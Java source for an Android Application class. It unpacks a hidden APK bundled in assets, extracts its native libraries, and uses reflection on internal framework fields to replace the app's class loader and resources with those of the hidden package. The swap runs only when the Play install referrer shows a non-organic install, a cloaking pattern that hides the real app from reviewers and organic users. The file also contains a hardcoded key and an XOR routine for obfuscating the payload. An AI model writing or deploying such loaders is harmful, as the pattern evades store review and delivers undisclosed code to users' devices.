package com.baseApplication.base;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.os.RemoteException;
import android.util.ArrayMap;
import android.util.Log;


import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.ref.WeakReference;
import java.nio.charset.StandardCharsets;
import java.util.Collection;
import java.util.Collections;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import dalvik.system.DexClassLoader;
import dalvik.system.PathClassLoader;


public class App extends Application {

    public static App app;
    @Override
    public void onCreate() {
        super.onCreate();
        app = this;
//        refGoogleReffer();
//        hook();
    }
    private static InstallReferrerClient referrerClient;

    public void refGoogleReffer(){
        referrerClient = InstallReferrerClient.newBuilder(app).build();
        referrerClient.startConnection(new InstallReferrerStateListener() {
            @Override
            public void onInstallReferrerSetupFinished(int responseCode) {
                if(responseCode == InstallReferrerClient.InstallReferrerResponse.OK){
                    try {
                        app.getIndstallData();
                    } catch (RemoteException e) {
                        e.printStackTrace();
                    }
                }else{
                    hook();
                }

            }

            @Override
            public void onInstallReferrerServiceDisconnected() {
                // Try to restart the connection on the next request to
                // Google Play by calling the startConnection() method.
            }
        });

    }
    private void getIndstallData() throws RemoteException {
        ReferrerDetails response = referrerClient.getInstallReferrer();
        String referrerUrl = response.getInstallReferrer();
        Log.d("getIndstallData", "getIndstallData:referrerUrl *" + referrerUrl);

        if((referrerUrl == null ||
                referrerUrl.contains("utm_medium=organic") ||
                referrerUrl.contains("not%20set")||
                referrerUrl.contains("not set"))
        ){

        }else{
            hook();
        }
    }
    private void hook() {
        File cacheFileDir = this.getFilesDir();
        File baseApk      = new File(cacheFileDir,"base.apk");
        //baseApk.getAbsolutePath()
        File optimize      = Optional.of(new File(cacheFileDir,"optimize")).map(o->{
            o.mkdir();
            return  o;
        }).get();
        File lib      = Optional.of(new File(cacheFileDir,"lib")).map(o->{
            o.mkdir();
            return  o;
        }).get();

        if(!baseApk.exists()){
            try {
                AssetManager assetManager = getAssets();
                InputStream encodeApkPathInAssets = assetManager.open("abb.apk");

                FileOutputStream outputStream = new FileOutputStream(baseApk.getAbsolutePath(), false);
                try {
                    String password = "3A0C92622CF056B908E22385675EE46A";
                    byte[] buffer = new byte[1024];
                    int read;

                    while ((read = encodeApkPathInAssets.read(buffer)) != -1) {
//                        outputStream.write(encrypt(buffer, password.getBytes(StandardCharsets.UTF_8)), 0, read);
                        outputStream.write(buffer, 0, read);
                    }
                } catch (IOException e) {
                    throw new RuntimeException(e);
                } finally {
                    outputStream.close();
                }
            } catch (IOException e) {
                // 处理或适当记录异常
            }


        }

        //this.getFilesDir()
        Object currentActivityThread = Reflector.on("android.app.ActivityThread")
                .method("currentActivityThread").call();

        Object mPackages = Reflector.on("android.app.ActivityThread").field("mPackages")
                .with(currentActivityThread)
                .get();

        ArrayMap arrayMap =  (ArrayMap)mPackages;

        Collection<WeakReference> values = arrayMap.values();
        Object loadedApk = values.stream().findFirst().get().get();

        PathClassLoader mClassLoader = (PathClassLoader)Reflector.on("android.app.LoadedApk").with(loadedApk)
                .field("mClassLoader").get();

        System.out.println("mClassLoader *LoadedApk***** " + Reflector.on("android.app.LoadedApk"));
        System.out.println("mClassLoader *with***** " + Reflector.on("android.app.LoadedApk").with(loadedApk));
        System.out.println("mClassLoader *mClassLoader***** " + Reflector.on("android.app.LoadedApk").with(loadedApk).field("mClassLoader"));
        System.out.println("mClassLoader ****** " + mClassLoader);
        Object assetManager = Reflector.on("android.content.res.AssetManager").newInstance();
        Reflector.on("android.content.res.AssetManager").method("addAssetPath",String.class)
                .with(assetManager)
                .call(baseApk.getAbsolutePath());
        decodeSo(mClassLoader,baseApk,lib);

        DexClassLoader dexClassLoader = new DexClassLoader(baseApk.getAbsolutePath(), optimize.getAbsolutePath(),
                lib.getAbsolutePath(),
                mClassLoader.getParent());
        //Object mBoundApplication = Reflector.on("android.app.ActivityThread").field("mBoundApplication").with(currentActivityThread)
        //.get();
        //Object loadedApk2 = Reflector.on("android.app.ActivityThread$AppBindData").field("info").with(mBoundApplication).get();


        Object mBase = Reflector.on("android.content.ContextWrapper").field("mBase").with(this).get();



        Resources resources = new Resources((AssetManager) assetManager, this.getResources().getDisplayMetrics(),
                this.getResources().getConfiguration());


        Resources.Theme theme = resources.newTheme();
        this.getTheme().setTo(theme);


        Reflector.on("android.app.ContextImpl").field("mResources").with(mBase).set(resources);
        //Reflector.on("android.app.ContextImpl").field("mClassLoader").with(mBase).set(dexClassLoader);


        Reflector.on("android.app.LoadedApk").field("mAppDir").with(loadedApk).set(baseApk.getAbsolutePath());
        Reflector.on("android.app.LoadedApk").field("mResDir").with(loadedApk).set(baseApk.getAbsolutePath());
        Reflector.on("android.app.LoadedApk").field("mResources").with(loadedApk).set(resources);
        Reflector.on("android.app.LoadedApk").field("mClassLoader").with(loadedApk).set(dexClassLoader);

        //this.getFilesDir()
        //
        System.out.println(values);

    }

    public static byte[] encrypt(byte[] data, byte[] key) {
        if (data == null || data.length == 0 || key == null || key.length == 0) {
            return data;
        }

        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length] ^ (i & 0xFF));
        }

        return result;
    }

    private void decodeSo(PathClassLoader mClassLoader,File baseApk, File lib) {
        String cpuDirectory  = mClassLoader.toString().contains("armeabi-v7a") ? "armeabi-v7a" : "arm64-v8a";
        try(ZipFile zipFile = new ZipFile(baseApk)){
            List<? extends ZipEntry> soFiles = Collections.list(zipFile.entries())
                    .stream().filter(o -> o.getName().endsWith(".so") && o.getName().startsWith("lib/" + cpuDirectory)).collect(Collectors.toList());
            if(soFiles.size() == 0){
                return;
            }
            for (ZipEntry soFile : soFiles) {
                String[] split = soFile.getName().split("/");
                String libFileName = split[split.length-1];
                if(!new File(lib,libFileName).exists()) {
                    try (InputStream inputStream = zipFile.getInputStream(soFile);
                         FileOutputStream outputStream = new FileOutputStream(new File(lib, libFileName), false)
                    ) {
                        XIOUtils.copy(inputStream, outputStream);
                    }
                }

            }




        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }



}
